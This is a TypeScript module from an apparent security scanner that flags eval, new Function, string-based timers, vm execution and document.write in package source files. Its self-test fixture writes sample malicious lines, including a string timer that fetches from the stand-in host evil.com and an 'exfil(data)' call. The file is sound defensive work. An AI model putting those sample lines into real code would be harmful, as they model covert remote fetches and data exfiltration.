/**
 * ═══════════════════════════════════════════════════════════
 *  AEGIS-AST — Eval Detection Scanner
 *  Owner: Person 2 (Security Detection Engine)
 *
 *  Scans JS/TS source files for dynamic code execution patterns —
 *  the classic obfuscation technique where attackers hide payloads
 *  in strings and execute them at runtime.
 * ═══════════════════════════════════════════════════════════
 */

import * as fs from 'fs';
import * as path from 'path';
import { walkSourceFiles } from '../utils/file_walker';

// Non-global regexes — safe to reuse per line without resetting lastIndex.
// setTimeout/setInterval are only suspicious when passed a string (not a function),
// so we match the opening paren and let the finding string show the full context.
const EVAL_PATTERNS: Array<{ pattern: RegExp; label: string }> = [
  { pattern: /\beval\s*\(/,                              label: 'eval' },
  { pattern: /\bnew\s+Function\s*\(/,                   label: 'new Function' },
  { pattern: /\bsetTimeout\s*\(\s*['"`]/,               label: 'setTimeout(string)' },
  { pattern: /\bsetInterval\s*\(\s*['"`]/,              label: 'setInterval(string)' },
  { pattern: /\bvm\.runInNewContext\s*\(/,              label: 'vm.runInNewContext' },
  { pattern: /\bvm\.runInThisContext\s*\(/,             label: 'vm.runInThisContext' },
  { pattern: /\bFunction\.prototype\.call\s*\(/,        label: 'Function.prototype.call' },
  { pattern: /\bdocument\.write\s*\(/,                  label: 'document.write' },
];

/**
 * Returns deduplicated labels for all eval patterns found in a single line.
 */
function getMatchedLabels(line: string): string[] {
  const seen = new Set<string>();
  for (const { pattern, label } of EVAL_PATTERNS) {
    if (pattern.test(line) && !seen.has(label)) {
      seen.add(label);
    }
  }
  return Array.from(seen);
}

/**
 * Scans all JS/TS source files in packageDir for dynamic code execution patterns.
 *
 * @param packageDir - Path to the extracted package root
 * @returns Object with `eval` array of human-readable finding strings.
 *          Returns { eval: [] } if nothing found. Never throws.
 */
export async function scanEval(
  packageDir: string
): Promise<{ eval: string[] }> {
  let files;
  try {
    files = walkSourceFiles(packageDir);
  } catch {
    return { eval: [] };
  }

  if (files.length === 0) return { eval: [] };

  const findings: string[] = [];

  for (const file of files) {
    try {
      const lines = file.content.split('\n');
      for (let i = 0; i < lines.length; i++) {
        const matchedLabels = getMatchedLabels(lines[i]);
        if (matchedLabels.length === 0) continue;

        const trimmed = lines[i].trim();
        findings.push(
          `${file.relativePath}:${i + 1} — ${trimmed} — contains ${matchedLabels.join(', ')}`
        );
      }
    } catch {
      // Skip files that error during processing
    }
  }

  return { eval: findings };
}

// ─── Self-test ────────────────────────────────────────────────────────────────
// Run directly:  npx ts-node src/scanner/eval.ts

if (require.main === module) {
  (async () => {
    const testDir = '/tmp/aegis-eval-test';
    const srcDir = path.join(testDir, 'lib');

    fs.mkdirSync(srcDir, { recursive: true });

    fs.writeFileSync(
      path.join(srcDir, 'index.js'),
      [
        // Clean lines — should NOT be flagged
        `const x = 1 + 1;`,
        `setTimeout(function() { doWork(); }, 1000);`,  // function ref, not string
        `setInterval(tick, 500);`,                       // function ref, not string
        // Suspicious — SHOULD be flagged
        `eval(atob('aGVsbG8gd29ybGQ='));`,
        `const fn = new Function('a', 'b', 'return a + b');`,
        `setTimeout('fetch("http://evil.com")', 0);`,
        `setInterval(\`exfil(data)\`, 5000);`,
        `vm.runInNewContext(userCode, sandbox);`,
        `vm.runInThisContext(decoded);`,
        `Function.prototype.call(null, payload);`,
        `document.write('<script>' + b64 + '</script>');`,
      ].join('\n')
    );

    console.log('Running scanEval on fake malicious package...\n');
    const result = await scanEval(testDir);

    if (result.eval.length === 0) {
      console.log('No findings (unexpected — check patterns)');
    } else {
      for (const finding of result.eval) {
        console.log('  FLAGGED:', finding);
      }
    }

    fs.rmSync(testDir, { recursive: true, force: true });
    console.log('\nCleanup done.');
  })();
}
